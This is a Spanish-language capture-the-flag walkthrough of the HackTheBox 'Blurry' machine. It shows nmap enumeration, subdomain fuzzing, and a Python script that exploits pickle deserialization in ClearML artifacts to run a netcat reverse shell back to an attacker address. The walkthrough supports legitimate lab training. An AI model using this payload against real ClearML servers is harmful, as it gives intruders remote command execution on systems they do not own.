#medium #tecnicas #windows #fuzzing 
### Ping
```python
ping -c 1 10.10.11.19
PING 10.10.11.19 (10.10.11.19) 56(84) bytes of data.
64 bytes from 10.10.11.19: icmp_seq=1 ttl=63 time=152 ms

--- 10.10.11.19 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 152.472/152.472/152.472/0.000 ms
```

### TTL 63 = Linux

### nmap
```python
# Nmap 7.94SVN scan initiated Sun Jun  9 12:19:54 2024 as: nmap -p- --open -sC -sV --min-rate 3000 -n -Pn -oN Scan 10.10.11.19
Nmap scan report for 10.10.11.19
Host is up (0.15s latency).
Not shown: 65477 closed tcp ports (reset), 56 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://app.blurry.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun  9 12:20:32 2024 -- 1 IP address (1 host up) scanned in 38.23 seconds
```

### Enumeración del puerto 80 (http)

tenemos una web que nos permite iniciar sesión con un usuario aleatorio. en este caso usamos admin
![[Pasted image 20240609155324.png]]

`admin`
después de iniciar sesión podemos identificar un proceso que se esta ejecutando
![[Pasted image 20240609155509.png]]

`experiments`
después de hacer clic en el proceso podemos ver el file path de un archivo en la web. se encuentra en otro subdominio así que vamos a enumerar
![[Pasted image 20240609155706.png]]

### Fuzzing con wfuzz

enumerando subdominios podemos encontrar efectivamente el subdominio donde se encuentra el archivo que hemos visto anteriormente y tenemos uno mas llamado `chat` 
![[Pasted image 20240609155815.png]]

### Api
podemos obtener las credenciales de una api lo cual es bueno.
![[Pasted image 20240611122420.png]]

### clearml-ini
al abrir `clearml-ini` vamos a ingresar las credenciales de la api que creamos esto nos creara un archivo `clearml.config` en el home 
![[Pasted image 20240611125038.png]]

### exploit
en esta web nos muestra un ejemplo de como aprovechar la vulnerabilidad para subir un archivo y poder tener ejecución de comandos usaremos este ejemplo para crear nuestro propio exploit para poder cargar un archivo a la maquina llamado `ddd-task` con la reverse shell 
![[Pasted image 20240611125301.png]]

### upload_pwned.py
```python
```python
import os
from clearml import Task

class RunCommand:
    def __reduce__(self):
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.40 9001 >/tmp/f"
        return (os.system, (cmd,))

command = RunCommand()

task = Task.init(project_name="Black Swan",
                 task_name="ddd-task",
                 tags=["review"],
                 task_type=Task.TaskTypes.data_processing,
                 output_uri=True)

task.upload_artifact(name="ddd_artifact",
                     artifact_object=command,
                     retries=2,
                     wait_on_upload=True)

task.execute_remotely(queue_name='default')
```

### shell
ahora solo debemos ejecutar el exploit y estaremos a la escucha para obtener la reverse shell. se subirá una nueva tarea al proyecto y luego de eso debemos esperar que se complete. 
`Nota# si no obtenemos la shell podemos usar ```clearml-agent execute --id``` pasandole el id de nuestra tarea para que se ejecute. y luego solo debemos esperar un rato para que este proceso se complete` 
![[Pasted image 20240611125901.png]]

### Escalada De privilegios

tenemos permisos sobre el binario `/usr/bin/evaluate_model /models/*.pth` así que podemos usarlo para explotar una escalada de privilegios
![[Pasted image 20240611141132.png]]


![[Pasted image 20240611152721.png]]